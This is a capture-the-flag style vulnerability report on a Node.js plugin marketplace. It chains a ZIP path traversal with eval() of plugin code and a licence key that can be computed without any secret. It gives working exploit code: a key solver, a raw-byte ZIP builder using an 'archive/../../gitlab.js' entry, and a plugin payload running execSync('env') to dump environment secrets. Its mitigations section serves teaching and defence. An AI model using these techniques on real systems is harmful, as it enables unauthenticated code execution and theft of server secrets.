# Vulnerability Report DOJO 51

---

## ZIP Path Traversal + RCE via eval() - Arbitrary Code Execution and Flag Disclosure

The application implements a Node.js plugin marketplace where users can upload a ZIP archive containing a plugin. The extraction library (yauzl) accepts filenames containing `archive/../../gitlab.js`, which `path.join()` silently normalises to a path outside the intended `archive/` directory. Combined with the fact that every plugin executes its `code` field through `eval()`, an attacker can overwrite a trusted plugin file and achieve full Remote Code Execution in a single request, without any prior authentication, since the licence key can be computed analytically.

---

## Root Cause - Step-by-Step Breakdown

The vulnerability chain spans two weaknesses that compound each other.

### Weakness 1 - ZIP extraction does not validate the resolved path

```javascript
const options = {
    lazyEntries:     true,
    strictFileNames: true,
    decodeStrings:   false
};

zipfile.on('entry', (entry) => {
    const filenameStr = entry.fileName.toString();
    const destpath = path.join(dest, filenameStr); // never validated against dest
    fs.mkdirSync(path.dirname(destpath), { recursive: true });
    const writeStream = fs.createWriteStream(destpath);
    readStream.pipe(writeStream);
});
```

`strictFileNames: true` rejects entries whose filename starts with a `../` sequence. It does not reject sequences that appear in the middle of a path. The filename `archive/../../gitlab.js` passes the check without error.

`path.join` then normalises the double traversal:

```
path.join('/tmp/app/plugins/archive', 'archive/../../gitlab.js')
  = '/tmp/app/plugins/gitlab.js'
```

A single level of `../` is not sufficient:

```
path.join('/tmp/app/plugins/archive', 'archive/../gitlab.js')
  = '/tmp/app/plugins/archive/gitlab.js'
```

Two levels are required: the first cancels the injected `archive/` segment, the second escapes the destination directory.

### Weakness 2 - Plugins execute their code field through eval()

```javascript
class Plugin {
  constructor(name, desc, category, code, icon) {
    this.name = name;
    this.desc = desc;
    this.category = category;
    this.code = code;
    this.icon = icon;
  }
  run() {
    eval(this.code);
  }
}
```

Because the plugin class is generated from the file on disk and `run()` passes `this.code` directly to `eval()`, overwriting `gitlab.js` with an attacker-controlled file grants full code execution when the plugin is invoked.

### The licence key is computable without any secret

The `validateKey` function applies four arithmetic constraints with no secret component:

```javascript
function validateKey(key) {
    const raw = key.replace(/-/g, '').toUpperCase();
    if (raw.length !== 16 || !/^[0-9A-F]{16}$/.test(raw)) return false;

    const [A, B, C, D] = [0, 4, 8, 12].map(i => parseInt(raw.slice(i, i + 4), 16));
    const f    = (A >> 12) & 0xF;
    const seed = (A ^ B ^ C) & 0xFFFF;

    return (f === 0xA || f === 0xC)
        && ((B ^ (A & 0xFF)) & 0xFF) === 0x37
        && C % 7 === 0
        && D === ((Math.imul(seed, 1103515245) + 1337) & 0xFFFF);
}
```

All four constraints can be solved analytically:

```python
import ctypes

def math_imul(a, b):
    return ctypes.c_int32(a * b).value

# Constraint 1: f = (A >> 12) & 0xF must be 0xA or 0xC
A = 0xA000

# Constraint 2: (B ^ (A & 0xFF)) & 0xFF == 0x37
# A & 0xFF = 0x00, so B & 0xFF must equal 0x37
B = 0x0037

# Constraint 3: C % 7 == 0
C = 0x0007

# Constraint 4: D == (Math.imul(seed, 1103515245) + 1337) & 0xFFFF
seed = (A ^ B ^ C) & 0xFFFF
# 0xA000 ^ 0x0037 ^ 0x0007 = 0xA030

D = (math_imul(seed, 1103515245) + 1337) & 0xFFFF
# math_imul(0xA030, 1103515245) = 1177736304
# D = (1177736304 + 1337) & 0xFFFF = 0xD9A9

key = f"{A:04X}-{B:04X}-{C:04X}-{D:04X}"
# A000-0037-0007-D9A9
```

---

## Exploitation - Step-by-Step

The attack is delivered in a single request. The server processes the inputs in order: extract ZIP, reload plugins, run plugin. Overwriting and executing happen in the same round-trip.

### Step 1 - Build the evil plugin

The overwritten `gitlab.js` must be a valid plugin export. The RCE payload goes into the `code` field. The require cache must be cleared first to force Node.js to reload the file from disk instead of serving the cached original.

```python
PAYLOAD_CODE = (
    "Object.keys(require.cache).forEach(k => delete require.cache[k]);"
    "const {execSync} = require('child_process');"
    "process.stdout.write(execSync('env').toString());"
)

EVIL_PLUGIN_JS = f"""
class Plugin {{
  constructor(name, desc, category, code, icon) {{
    this.name = name; this.desc = desc; this.category = category;
    this.code = code; this.icon = icon;
  }}
  run()     {{ eval(this.code); }}
  getName() {{ return this.name; }}
  get()     {{ return {{ name: this.name, desc: this.desc,
                        category: this.category, icon: this.icon,
                        code: this.code }}; }}
}}
const plugin = new Plugin(
  "Gitlab", "pwned", "developer-tools",
  "{PAYLOAD_CODE}",
  "PWNED"
);
module.exports = plugin;
""".strip()
```

### Step 2 - Craft the malicious ZIP

Python's `zipfile` module sanitises filenames containing `..`, so the ZIP must be constructed by writing raw bytes directly. The extra field length is set to 0 to avoid the `extra field length exceeds extra field buffer size` error that yauzl raises on malformed extra data.

```python
import io, struct, zlib, base64

def build_traversal_zip(content_bytes):
    filename = b'archive/../../gitlab.js'

    crc  = zlib.crc32(content_bytes) & 0xFFFFFFFF
    size = len(content_bytes)
    fn   = len(filename)
    buf  = io.BytesIO()

    buf.write(struct.pack('<4sHHHHHIIIHH',
        b'PK\x03\x04', 20, 0, 0, 0, 0, crc, size, size, fn, 0))
    buf.write(filename)
    buf.write(content_bytes)

    cd_offset = buf.tell()

    buf.write(struct.pack('<4sHHHHHHIIIHHHHHII',
        b'PK\x01\x02', 0x0314, 20, 0, 0, 0, 0,
        crc, size, size, fn, 0, 0, 0, 0, 0o100644 << 16, 0))
    buf.write(filename)
    cd_size = buf.tell() - cd_offset

    buf.write(struct.pack('<4sHHHHIIH',
        b'PK\x05\x06', 0, 0, 1, 1, cd_size, cd_offset, 0))

    return buf.getvalue()

zip_b64 = base64.b64encode(
    build_traversal_zip(EVIL_PLUGIN_JS.encode())
).decode()
```

### Step 3 - Send the request

key: A000-0037-0007-D9A9,
plugin: Gitlab,
zipData: zip_b64,


---

## Proof of Concept

### Single request - ZIP upload + plugin execution

| Field | Value |
|---|---|
| `key` | `A000-0037-0007-D9A9` |
| `plugin` | `Gitlab` |
| `zipData` | *(base64 of the traversal ZIP, see script below)* |

**Server execution order:**

1. `validateKey('A000-0037-0007-D9A9')` passes all four constraints
2. `unzip(zipData, 'archive/')` extracts `archive/../../gitlab.js` and writes `/tmp/app/plugins/gitlab.js`
3. `getPlugins('plugins/')` reloads `gitlab.js` from disk via `require()`
4. `plugin['Gitlab'].run()` calls `eval(this.code)` which executes `execSync('env')`

**Response (stdout piped through `process.stdout.write`):**

```
USER=nobody
SHLVL=4
HOME=/
LOGNAME=nobody
TINI_KILL_PROCESS_GROUP=1
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
SHELL=/bin/sh
PWD=/tmp/app
FLAG=FLAG{D3ad_B0l7_G0t_Pwn3d}
```

**Flag:** `FLAG{D3ad_B0l7_G0t_Pwn3d}`


---

## Impact

An unauthenticated attacker can achieve full Remote Code Execution as the application user (`nobody`) in a single HTTP request. All environment variables, including the server-side flag, are fully disclosed. Any file in the plugin directory can also be permanently overwritten, affecting all users of the marketplace.

---

## Mitigation

### 1. Validate the resolved path stays within the destination directory

```javascript
zipfile.on('entry', (entry) => {
    const name   = entry.fileName.toString();
    const dest   = path.resolve('/tmp/app/plugins/archive');
    const target = path.resolve(dest, name);

    if (!target.startsWith(dest + path.sep)) {
        return zipfile.readEntry();
    }

    fs.mkdirSync(path.dirname(target), { recursive: true });
    zipfile.openReadStream(entry, (err, rs) => {
        rs.pipe(fs.createWriteStream(target));
    });
});
```

### 2. Never eval() untrusted code

Remove `eval(this.code)` from the plugin runner. If dynamic execution is required, use a sandboxed worker process (`vm.runInNewContext` with a resource-limited context, or a separate child process with no access to the parent environment).

### 3. Validate plugin integrity after extraction

After extraction, verify that no file in the `plugins/` directory was modified outside the archive subdirectory, for example by comparing file hashes captured at startup.

### 4. Harden the licence key scheme

The current scheme uses public arithmetic with no secret. Replace it with an HMAC-based token signed with a server-side secret key, so valid keys cannot be computed without knowledge of that secret.

---

## Vulnerability Classification

| Field | Value |
|---|---|
| **Type** | ZIP Path Traversal + eval() Code Injection |
| **Vector** | Filename in ZIP entry, path normalisation bypass, file overwrite |
| **Impact** | Remote Code Execution, full environment disclosure |
| **Authentication** | Not required (licence key is analytically computable) |
| **CWE** | CWE-22 (Path Traversal), CWE-95 (eval Injection) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |